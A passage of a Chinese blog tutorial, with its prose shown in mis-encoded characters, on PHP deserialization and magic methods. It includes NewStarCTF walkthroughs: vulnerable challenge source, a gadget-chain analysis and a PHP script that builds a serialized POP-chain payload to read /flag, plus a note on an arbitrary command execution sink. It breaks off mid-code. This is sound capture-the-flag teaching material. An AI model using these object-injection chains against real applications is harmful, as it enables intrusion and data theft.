class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sayHello</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-string">&quot;secret123&quot;</span>);<br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serialized</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>è¾“å‡ºï¼š</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Alice&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;Userpassword&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;secret123&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li><code>O:4:&quot;User&quot;</code> â†’ è¿™æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆObjectï¼‰ï¼Œç±»åæ˜¯ <code>&quot;User&quot;</code>ï¼ˆé•¿åº¦ 4ï¼‰ã€‚</li><li><code>2</code> â†’ è¯¥å¯¹è±¡æœ‰ 2 ä¸ªå±æ€§ï¼ˆ<code>public $name</code> å’Œ <code>private $password</code>ï¼‰ã€‚</li><li><code>s:4:&quot;name&quot;;s:5:&quot;Alice&quot;;</code> â†’ <code>public $name</code> çš„å€¼æ˜¯ <code>&quot;Alice&quot;</code>ã€‚</li><li><code>s:12:&quot;Userpassword&quot;;s:9:&quot;secret123&quot;;</code> â†’ <code>private $password</code> çš„å€¼æ˜¯ <code>&quot;secret123&quot;</code>ã€‚</li></ul><p>ğŸ”¹ <strong>ä½† <code>sayHello()</code> æ–¹æ³•å¹¶æ²¡æœ‰å‡ºç°åœ¨åºåˆ—åŒ–ç»“æœä¸­</strong>ï¼Œè¯´æ˜æ–¹æ³•ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚</p><p>2. </p><p><strong>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è¦ä¿è¯æœ‰è¯¥ç±»å­˜åœ¨ï¼Œå› ä¸ºæ²¡æœ‰åºåˆ—åŒ–æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬ååºåˆ—åŒ–å›æ¥è¿˜è¦ä¾é è¯¥ç±»çš„æ–¹æ³•è¿›è¡Œã€‚</strong></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-35-07.png" alt="PixPin_2025-04-07_16-35-07"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-35-17.png" alt="PixPin_2025-04-07_16-35-17"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-35-25.png" alt="PixPin_2025-04-07_16-35-25"></p><p><strong>ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–å¯¹è±¡æˆå­—ç¬¦ä¸²å‘¢ï¼Ÿåœ¨å¼€å‘ä¸­åˆèµ·åˆ°ä»€ä¹ˆä½œç”¨ï¼Ÿ</strong></p><p>å› ä¸ºPHPæ–‡ä»¶æ‰§è¡Œåä¼šæŠŠå†…å­˜çš„æ•°æ®è¿›è¡Œé”€æ¯ï¼Œå¦‚æœä¸‹ä¸€ä¸ªæ–‡ä»¶æƒ³ç”¨åˆ°åˆšåˆšé”€æ¯å¯¹è±¡çš„<strong>å±æ€§</strong>å’Œ<strong>å€¼</strong>å°±è¿˜è¦é‡æ–°å®ä¾‹åŒ–newä¸€æ¬¡å¯¹è±¡ï¼Œæ‰€ä»¥æ‰ä¼šå°†å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ç„¶åå­˜å‚¨ï¼Œä¹Ÿé¿å…é‡æ–°å®ä¾‹åŒ–å¸¦æ¥çš„è€—è´¹ã€‚</p><p>3. </p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-02_16-35-11.png" alt="PixPin_2025-04-02_16-35-11"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-02_16-36-03.png" alt="PixPin_2025-04-02_16-36-03"></p><h2 id="ä»€ä¹ˆæ˜¯é­”æœ¯æ–¹æ³•"><a href="#ä»€ä¹ˆæ˜¯é­”æœ¯æ–¹æ³•" class="headerlink" title="ä»€ä¹ˆæ˜¯é­”æœ¯æ–¹æ³•"></a>ä»€ä¹ˆæ˜¯é­”æœ¯æ–¹æ³•</h2><p>é­”æœ¯æ–¹æ³•æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–¹æ³•ï¼Œä¼šåœ¨å¯¹è±¡æ‰§è¡ŒæŸäº›æ“ä½œæ—¶è¦†ç›–PHPçš„é»˜è®¤æ“ä½œ</p><p>å¸¸ç”¨çš„ï¼š</p><p><a href="https://zhuanlan.zhihu.com/p/377676274">https://zhuanlan.zhihu.com/p/377676274</a></p><table><thead><tr><th align="left">é­”æœ¯æ–¹æ³•åç§°</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">__sleep()</td><td align="left">serialize() æ—¶è°ƒç”¨</td></tr><tr><td align="left">__wakeup()</td><td align="left">unserialize() æ—¶è°ƒç”¨</td></tr><tr><td align="left">__toString()</td><td align="left">ç”¨äºä¸€ä¸ªå¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è°ƒç”¨</td></tr><tr><td align="left">__invoke()</td><td align="left">å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶</td></tr><tr><td align="left">__construct()</td><td align="left">æ„é€ å‡½æ•°ï¼Œæ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•  (ä½†åœ¨unserialize()æ—¶æ˜¯ä¸ä¼šè‡ªåŠ¨è°ƒç”¨çš„)ã€‚</td></tr><tr><td align="left">__destruct()</td><td align="left">ææ„å‡½æ•°ï¼ŒæŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œ</td></tr><tr><td align="left">__set()</td><td align="left">åœ¨ç»™ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§èµ‹å€¼æ—¶</td></tr><tr><td align="left">__get()</td><td align="left">è¯»å–ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§çš„å€¼æ—¶</td></tr><tr><td align="left">__call()</td><td align="left">å½“å¯¹è±¡è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶</td></tr></tbody></table><p> __toString è§¦å‘çš„æ¡ä»¶æ¯”è¾ƒå¤šï¼Œä¹Ÿå› ä¸ºè¿™ä¸ªåŸå› å®¹æ˜“è¢«å¿½ç•¥ï¼Œå¸¸è§çš„è§¦å‘æ¡ä»¶æœ‰ä¸‹é¢å‡ ç§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">(1)<span class="hljs-built_in">echo</span> (<span class="hljs-variable">$obj</span>) / <span class="hljs-built_in">print</span>(<span class="hljs-variable">$obj</span>) æ‰“å°æ—¶ä¼šè§¦å‘<br><br>(2)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿æ¥æ—¶<br><br>(3)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶<br><br>(4)ååºåˆ—åŒ–å¯¹è±¡ä¸å­—ç¬¦ä¸²è¿›è¡Œ==æ¯”è¾ƒæ—¶ï¼ˆPHPè¿›è¡Œ==æ¯”è¾ƒçš„æ—¶å€™ä¼šè½¬æ¢å‚æ•°ç±»å‹ï¼‰<br><br>(5)ååºåˆ—åŒ–å¯¹è±¡å‚ä¸æ ¼å¼åŒ–SQLè¯­å¥ï¼Œç»‘å®šå‚æ•°æ—¶<br><br>(6)ååºåˆ—åŒ–å¯¹è±¡åœ¨ç»è¿‡phpå­—ç¬¦ä¸²å‡½æ•°ï¼Œå¦‚ strlen()ã€addslashes()æ—¶<br><br>(7)åœ¨in_array()æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„æ•°ç»„ä¸­æœ‰toStringè¿”å›çš„å­—ç¬¦ä¸²çš„æ—¶å€™toStringä¼šè¢«è°ƒç”¨<br><br>(8)ååºåˆ—åŒ–çš„å¯¹è±¡ä½œä¸º class_exists() çš„å‚æ•°çš„æ—¶å€™<br></code></pre></td></tr></table></figure><p>é­”æœ¯æ–¹æ³•æ€»ç»“</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-40-09.png"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-04-07_16-40-18.png" alt="PixPin_2025-04-07_16-40-18"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="ååºåˆ—åŒ–æ¼æ´çš„æˆå› ï¼š"><a href="#ååºåˆ—åŒ–æ¼æ´çš„æˆå› ï¼š" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´çš„æˆå› ï¼š"></a>ååºåˆ—åŒ–æ¼æ´çš„æˆå› ï¼š</h2><p>åœ¨ PHP ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœ <code>unserialize()</code> å¤„ç†çš„æ˜¯<strong>ç”¨æˆ·å¯æ§çš„è¾“å…¥</strong>ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥ä¼ªé€ å¯¹è±¡çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œ<strong>ä¿®æ”¹</strong>åŸæœ‰ç±»çš„<strong>å±æ€§å€¼</strong>ï¼Œç”šè‡³<strong>è§¦å‘</strong>ç±»ä¸­çš„<strong>é­”æœ¯æ–¹æ³•</strong>ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p><strong>ååºåˆ—åŒ–æ¼æ´æ˜¯ç”±äºunserializeå‡½æ•°æ¥æ”¶åˆ°äº†æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ç¯¡æ”¹æˆå‘˜å±æ€§åå¯¼è‡´çš„ã€‚</strong></p><h2 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-UnserializeOne"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-UnserializeOne" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]UnserializeOne"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]UnserializeOne</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><code>Start</code><ul><li>ææ„æ–¹æ³• <code>__destruct()</code>ï¼šè¾“å‡º <code>Welcome to NewStarCTF, $this-&gt;name;</code></li><li><code>__isset()</code> æ–¹æ³•ï¼šä¼šè°ƒç”¨ <code>$this-&gt;func</code> è¿™ä¸ªå±æ€§</li></ul></li><li><code>Sec</code><ul><li><code>__toString()</code> æ–¹æ³•ï¼šè°ƒç”¨ <code>$this-&gt;obj-&gt;check($this-&gt;var);</code></li><li><code>__invoke()</code> æ–¹æ³•ï¼šè¯»å– <code>/flag</code> å¹¶è¾“å‡ºã€‚</li></ul></li><li><code>Easy</code><ul><li><code>__call()</code> é­”æœ¯æ–¹æ³•ï¼š<code>$this-&gt;cla = clone $var[0];</code>ï¼ˆè°ƒç”¨æ—¶å…‹éš† <code>$var[0]</code>ï¼‰</li></ul></li><li><code>eeee</code><ul><li><code>__clone()</code> æ–¹æ³•ï¼šæ£€æŸ¥ <code>$this-&gt;obj-&gt;cmd</code> æ˜¯å¦å­˜åœ¨ã€‚</li></ul></li></ol><p>ç›®æ ‡æ˜¯ <strong>è§¦å‘ <code>Sec</code> ç±»çš„ <code>__invoke()</code> æ–¹æ³•</strong>ï¼Œè¿™æ ·å¯ä»¥ <code>file_get_contents(&#39;/flag&#39;)</code> è¯»å– flagã€‚</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livescript">è¦ è§¦å‘ Sec ç±»çš„ `__invoke()` æ–¹æ³•-&gt;æŠŠå¯¹è±¡å½“ä½œå‡½æ•°è°ƒç”¨ï¼š-&gt;Startç±»çš„_issetæ–¹æ³•ï¼šæŠŠSecç±»å½“ä½œfuncå±æ€§<br><br>-&gt;è§¦å‘issetæ–¹æ³•-&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">eeee</span>ç±»çš„__cloneæ–¹æ³•-&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Easy</span>-&gt;è§¦å‘call-&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Sec</span>-&gt;__toString-&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Start</span>çš„__destruct<br></code></pre></td></tr></table></figure><p>åç»­å°±æ˜¯ç¼–å†™exp</p><p>å…ˆå°†ä»£ç å¤åˆ¶è¿›vscodeï¼Œç„¶åæŠŠæ‰€æœ‰å’Œå±æ€§æ— å…³çš„åˆ é™¤ã€‚</p><p>privateçš„å±æ€§æ”¹æˆpublic ç¼ºçš„å±æ€§è¡¥å…¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br> <br><span class="hljs-variable">$res</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>;<br><span class="hljs-variable">$res</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>;<span class="hljs-comment">//ç¬¬ä¸€æ¡é“¾</span><br><span class="hljs-variable">$res</span>-&gt;name-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>;<span class="hljs-comment">//ç¬¬äºŒæ¡é“¾</span><br><span class="hljs-variable">$res</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-keyword">new</span> eeee;<span class="hljs-comment">//ç¬¬ä¸‰æ¡é“¾</span><br><span class="hljs-variable">$res</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>;<span class="hljs-comment">//ç¬¬å››æ¡é“¾</span><br><span class="hljs-variable">$res</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj-&gt;func=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>;<span class="hljs-comment">//ç¬¬äº”æ¡é“¾</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$res</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>å…¥æ‰‹ç‚¹ï¼š ($this-&gt;func)($this-&gt;var); å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤</p><figure class="highlight ruby"><table><tr><td 